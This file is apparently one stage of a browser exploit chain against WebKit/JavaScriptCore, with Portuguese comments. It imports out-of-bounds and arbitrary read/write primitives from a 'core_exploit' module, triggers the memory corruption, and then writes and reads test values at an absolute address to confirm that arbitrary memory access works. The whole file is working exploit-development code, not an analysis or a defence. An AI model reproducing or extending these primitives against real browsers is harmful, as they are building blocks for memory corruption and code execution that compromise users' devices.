// js/script3/testArrayBufferVictimCrash.mjs (Abordagem v13: Usando Novas Primitivas arb_read/arb_write)
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    // oob_array_buffer_real, // Não mais necessário diretamente aqui
    // oob_dataview_real,     // Não mais necessário diretamente aqui
    // oob_write_absolute,    // Usado internamente por arb_write/arb_read no core_exploit
    // oob_read_absolute,     // Usado internamente por arb_write/arb_read no core_exploit
    clearOOBEnvironment,
    isOOBReady,
    arb_read,  // <-- NOVA PRIMITIVA IMPORTADA
    arb_write  // <-- NOVA PRIMITIVA IMPORTADA
} from '../core_exploit.mjs'; // Certifique-se que este é o core_exploit.mjs ATUALIZADO!
// import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs'; // Não são mais necessários diretamente aqui

export const FNAME_MODULE_V28 = "GetterArbitraryRead_v13_UsingNewArbRW";

// === Constantes ===
// Endereço absoluto baixo que usaremos para testar arb_read/arb_write.
const TEST_ABSOLUTE_ADDRESS = new AdvancedInt64(0x00000D00, 0x00000000); // 3328d

// Valores de teste para escrever e ler.
const VALUE_A = new AdvancedInt64(0xAAAAAAAA, 0x11111111);
const VALUE_B = new AdvancedInt64(0xBBBBBBBB, 0x22222222);
const VALUE_C_32BIT = 0xCAFEBABE; // Para teste de leitura/escrita de 32 bits

// Não precisamos mais de um getter ou de offsets para copiar dados dentro do oob_buffer,
// pois arb_read/arb_write operam diretamente e retornam valores.

export async function executeArrayBufferVictimCrashTest() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.testNewArbitraryRWPrimitives`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Testando Novas Primitivas arb_read/arb_write ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_V28} Inic...`;

    let errorCapturedMain = null;
    let exploit_result = {
        success: false,
        address_targeted_str: TEST_ABSOLUTE_ADDRESS.toString(true),
        value_A_written_str: VALUE_A.toString(true),
        value_A_read_back_str: null,
        value_B_written_str: VALUE_B.toString(true),
        value_B_read_back_str: null,
        value_C_written_str: toHex(VALUE_C_32BIT),
        value_C_read_back_str: null,
        message: "Teste não iniciado."
    };

    try {
        // PASSO 1: Inicializar o ambiente OOB.
        // triggerOOB_primitive no core_exploit.mjs atualizado já deve expandir m_length.
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) { // isOOBReady no core_exploit.mjs atualizado verifica m_length expandido.
            throw new Error("Ambiente OOB não pôde ser inicializado ou não está pronto (m_length não expandido?).");
        }
        logS3("PASSO 1: Ambiente OOB inicializado e pronto para L/E Arbitrária.", "info", FNAME_CURRENT_TEST);

        // PASSO 2: Testar arb_write e arb_read com VALOR_A (64 bits)
        logS3(`PASSO 2: Tentando escrever VALOR_A (${exploit_result.value_A_written_str}) no endereço ${exploit_result.address_targeted_str}...`, "info", FNAME_CURRENT_TEST);
        arb_write(TEST_ABSOLUTE_ADDRESS, VALUE_A, 8);
        logS3(`  Escrita de VALOR_A (supostamente) realizada.`, "info", FNAME_CURRENT_TEST);

        logS3(`  Tentando ler de volta do endereço ${exploit_result.address_targeted_str}...`, "info", FNAME_CURRENT_TEST);
        const read_A_obj = arb_read(TEST_ABSOLUTE_ADDRESS, 8);
        exploit_result.value_A_read_back_str = isAdvancedInt64Object(read_A_obj) ? read_A_obj.toString(true) : "ERRO_LEITURA_A";
        logS3(`  Valor lido (esperado A): ${exploit_result.value_A_read_back_str}`, "leak", FNAME_CURRENT_TEST);

        if (exploit_result.value_A_read_back_str !== exploit_result.value_A_written_str) {
            throw new Error(`Falha no teste de VALOR_A: Lido ${exploit_result.value_A_read_back_str}, Esperado ${exploit_result.value_A_written_str}`);
        }
        logS3(`  SUCESSO: VALOR_A escrito e lido corretamente!`, "good", FNAME_CURRENT_TEST);

        // PASSO 3: Testar arb_write e arb_read com VALOR_B (64 bits, sobrescrevendo A)
        logS3(`PASSO 3: Tentando escrever VALOR_B (${exploit_result.value_B_written_str}) no endereço ${exploit_result.address_targeted_str}...`, "info", FNAME_CURRENT_TEST);
        arb_write(TEST_ABSOLUTE_ADDRESS, VALUE_B, 8);
        logS3(`  Escrita de VALOR_B (supostamente) realizada.`, "info", FNAME_CURRENT_TEST);

        logS3(`  Tentando ler de volta do endereço ${exploit_result.address_targeted_str}...`, "info", FNAME_CURRENT_TEST);
        const read_B_obj = arb_read(TEST_ABSOLUTE_ADDRESS, 8);
        exploit_result.value_B_read_back_str = isAdvancedInt64Object(read_B_obj) ? read_B_obj.toString(true) : "ERRO_LEITURA_B";
        logS3(`  Valor lido (esperado B): ${exploit_result.value_B_read_back_str}`, "leak", FNAME_CURRENT_TEST);

        if (exploit_result.value_B_read_back_str !== exploit_result.value_B_written_str) {
            throw new Error(`Falha no teste de VALOR_B: Lido ${exploit_result.value_B_read_back_str}, Esperado ${exploit_result.value_B_written_str}`);
        }
        logS3(`  SUCESSO: VALOR_B escrito e lido corretamente!`, "good", FNAME_CURRENT_TEST);

        // PASSO 4: Testar arb_write e arb_read com VALOR_C (32 bits)
        // Vamos usar um offset pequeno do endereço principal para não interferir com o QWORD anterior, se quisermos verificar depois.
        // Ou podemos simplesmente sobrescrever. Para simplificar, vamos sobrescrever os primeiros 4 bytes.
        const address_for_c = TEST_ABSOLUTE_ADDRESS; // Escreve no mesmo local, afetando parte de B
        logS3(`PASSO 4: Tentando escrever VALOR_C (${exploit_result.value_C_written_str}) no endereço ${address_for_c.toString(true)} (32 bits)...`, "info", FNAME_CURRENT_TEST);
        arb_write(address_for_c, VALUE_C_32BIT, 4);
        logS3(`  Escrita de VALOR_C (supostamente) realizada.`, "info", FNAME_CURRENT_TEST);

        logS3(`  Tentando ler de volta (32 bits) do endereço ${address_for_c.toString(true)}...`, "info", FNAME_CURRENT_TEST);
        const read_C_val = arb_read(address_for_c, 4); // Lê como número
        exploit_result.value_C_read_back_str = toHex(read_C_val);
        logS3(`  Valor lido (esperado C): ${exploit_result.value_C_read_back_str}`, "leak", FNAME_CURRENT_TEST);
        
        if (exploit_result.value_C_read_back_str !== exploit_result.value_C_written_str) {
            throw new Error(`Falha no teste de VALOR_C: Lido ${exploit_result.value_C_read_back_str}, Esperado ${exploit_result.value_C_written_str}`);
        }
        logS3(`  SUCESSO: VALOR_C (32 bits) escrito e lido corretamente!`, "good", FNAME_CURRENT_TEST);

        // Se todos os testes passaram
        exploit_result.success = true;
        exploit_result.message = `SUCESSO! Primitivas arb_read/arb_write funcionaram para 64 e 32 bits no endereço ${exploit_result.address_targeted_str}.`;
        document.title = `${FNAME_MODULE_V28}: ARB R/W OK!`;
        logS3(`  !!!! ${exploit_result.message} !!!!`, "vuln", FNAME_CURRENT_TEST);

    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`ERRO CRÍTICO GERAL: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
        if (e_outer_main.stack) logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST);
        exploit_result.message = `Erro geral: ${e_outer_main.name} - ${e_outer_main.message}`; // Sobrescreve msg de sucesso
        document.title = `${FNAME_MODULE_V28} ERRO CRÍTICO`;
    } finally {
        clearOOBEnvironment({force_clear_even_if_not_setup: true}); // Sempre limpa o ambiente
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Resultado Teste Novas Primitivas arb_read/arb_write (v13): Success=${exploit_result.success}, Msg='${exploit_result.message}'`, exploit_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`  Endereço Alvo: ${exploit_result.address_targeted_str}`, "info", FNAME_CURRENT_TEST);
        logS3(`  Teste A (64b): Escrito=${exploit_result.value_A_written_str}, Lido=${exploit_result.value_A_read_back_str}`, "info", FNAME_CURRENT_TEST);
        logS3(`  Teste B (64b): Escrito=${exploit_result.value_B_written_str}, Lido=${exploit_result.value_B_read_back_str}`, "info", FNAME_CURRENT_TEST);
        logS3(`  Teste C (32b): Escrito=${exploit_result.value_C_written_str}, Lido=${exploit_result.value_C_read_back_str}`, "info", FNAME_CURRENT_TEST);
    }

    return {
        errorOccurred: errorCapturedMain,
        exploit_attempt_result: exploit_result,
        toJSON_details: { 
            probe_variant: FNAME_MODULE_V28, // Mantendo a estrutura, embora não haja mais "probe" aqui
            status: exploit_result.success ? "success_new_arb_rw" : "failed_new_arb_rw",
            message: exploit_result.message
        }
    };
}
